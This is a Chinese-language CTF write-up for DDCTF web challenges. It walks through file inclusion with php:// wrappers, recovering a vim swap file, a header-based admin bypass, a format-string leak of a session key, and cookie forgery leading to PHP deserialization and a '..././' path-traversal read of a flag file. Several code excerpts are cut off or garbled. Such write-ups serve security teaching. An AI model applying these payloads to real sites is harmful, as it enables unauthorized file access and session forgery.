## 滴~ 这是一道脑洞题。。。
后面的字符串，可以两次base64解码，一次url解码  
应该是文件包含，写了个转换的小脚本
    import binascii
    import base64
    filename = input().encode(encoding='utf-8')
    hexstr = binascii.b2a_hex(filename)
    base1 = base64.b64encode(hexstr)
    base2 = base64.b64encode(base1)
    print(base2.decode())
一开始我读的是php://filter/read=convert.base64-encode/resource=index.php，但是没有任何返回，于是我直接读了index.php，发现图片data的协议存在数据，复制图片链接base64解码
    '.$_GET['jpg'].'';
    $file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
    echo $file.'';
    $file = str_replace("config","!", $file);
    echo $file.'';
    $txt = base64_encode(file_get_contents($file));
    echo "";
    /*
     * Can you find the flag file?
     *
     */
    ?>
这道题是有一个原题的，  
从原题可以知道这里是绕不过代码层面的，但是原题读取的是.idea文件夹，本题没有，然后这就是这道题最脑洞的地方，上面得CSDN的博客url是有作用的，并且第四行的日期和博文发布的时间不是对应的，需要去作者文章下这个日期的文章  
在这篇文章里讲了vim的临时文件，并且文章提到了.practice.txt.swp这个文件，然后我试了半天swp,swo.swn,最后发现只要把前面的.去掉，访问  
题目返回f1ag!ddctf.php，由于源码中会把config替换为!于是访问f1agconfigddctf.php编码形式再解码即可拿f1ag!ddctf.php源码
变量覆盖+php伪协议，?k=php://input&uid=1 post数据传1  
## WEB 签到题
考点是反序列化  
直接访问提示没有访问权限，查看源代码，查看发起的网络请求发现了一个接口  
发现一个ddctf_username的header头，改为admin访问这个接口  
返回了一个文件名，访问返回了两个新文件的源代码
    url:app/Application.php
     $errMsg,
                'data' => $data];
            $ret = json_encode($ret);
            header('Content-type: application/json');
            echo $ret;
        }
        public function auth() {
            $DIDICTF_ADMIN = 'admin';
            if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
                $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
                return TRUE;
            }else{
                $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
                exit();
            }
        }
        private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../','',$path);
        $path=str_replace('..\\','',$path);
        return $path;
    }
    public function __destruct() {
        if(empty($this->path)) {
            exit();
        }else{
            $path = $this->sanitizepath($this->path);
            if(strlen($path) !== 18) {
                exit();
            }
            $this->response($data=file_get_contents($path),'Congratulations');
        }
        exit();
    }
    }
    ?>
    url:app/Session.php
    get_key();
                if($this->session_read()) {
                    $data = 'DiDI Welcome you %s';
                    $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                    parent::response($data,'sucess');
                }else{
                    $this->session_create();
                    $data = 'DiDI Welcome you';
                    parent::response($data,'sucess');
                }
            }
        }
        private function get_key() {
            //eancrykey  and flag under the folder
            $this->eancrykey =  file_get_contents('../config/key.txt');
        }
        public function session_read() {
            if(empty($_COOKIE)) {
            return FALSE;
            }
            $session = $_COOKIE[$this->cookie_name];
            if(!isset($session)) {
                parent::response("session not found",'error');
                return FALSE;
            }
            $hash = substr($session,strlen($session)-32);
            $session = substr($session,0,strlen($session)-32);
            if($hash !== md5($this->eancrykey.$session)) {
                parent::response("the cookie data not match",'error');
                return FALSE;
            }
            $session = unserialize($session);
            if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
                return FALSE;
            }
            if(!empty($_POST["nickname"])) {
                $arr = array($_POST["nickname"],$this->eancrykey);
                $data = "Welcome my friend %s";
                foreach ($arr as $k => $v) {
                    $data = sprintf($data,$v);
                }
                parent::response($data,"Welcome");
            }
            if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
                parent::response('the ip addree not match'.'error');
                return FALSE;
            }
            if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
                parent::response('the user agent not match','error');
                return FALSE;
            }
            return TRUE;
        }
        private function session_create() {
            $sessionid = '';
            while(strlen($sessionid)  md5(uniqid($sessionid,TRUE)),
                'ip_address' => $_SERVER['REMOTE_ADDR'],
                'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                'user_data' => '',
            );
            $cookiedata = serialize($userdata);
            $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
            $expire = $this->cookie_expiration + time();
            setcookie(
                $this->cookie_name,
                $cookiedata,
                $expire,
                $this->cookie_path,
                $this->cookie_domain,
                $this->cookie_secure
                );
        }
    }
    $ddctf = new Session();
    $ddctf->index();
    ?>
代码逻辑大概是自己写了个客户端session，如果符合一定标准则会反序列化请求的客户端session，Application的类的__destruct方法存在文件读取，传入的是path变量，111行存在反序列化操作，所以path变量可控，结合即可任意文件读取。但是要进行反序列化操作必须过107层的MD5判断，但是$this->eancrykey不知，118行和121行可以通过格式化字符串读取$this->eancrykey,$_POST["nickname"]传%s，这样第一次格式化%s还是被格式化为%s，第二次%s替换为$this->eancrykey  
拿到了$this->eancrykey，我们就可以伪造任意客户端cookie，然后构造序列化字符串  
需要注意的是，我们伪造的path变量必须为18为长度，并且代码会把../替换为空，注释提示flag文件在同一目录，猜测为../config/flag.txt  
所以构造path为 ..././config/flag.txt,刚好替换后为flag地址，并且长度为18  
exp:
     $errMsg,
                'data' => $data];
            $ret = json_encode($ret);
            header('Content-type: application/json');
            echo $ret;
        }
        public function auth() {
            $DIDICTF_ADMIN = 'admin';
            if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
                $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
                return TRUE;
            }else{
                $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
                exit();
            }
        }
        private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../','',$path);
        $path=str_replace('..\\','',$path);
        return $path;
        }
    }
    $class = unserialize(urldecode("a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22a266d530ea78089fca551da75c2713a4%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%22222.18.127.50%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A73%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%3B+rv%3A56.0%29+Gecko%2F20100101+Firefox%2F56.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D0d90002f458ae1d96eb1dffdc081c822"));
    $app = new Application();
    $secret = "EzblrbNS";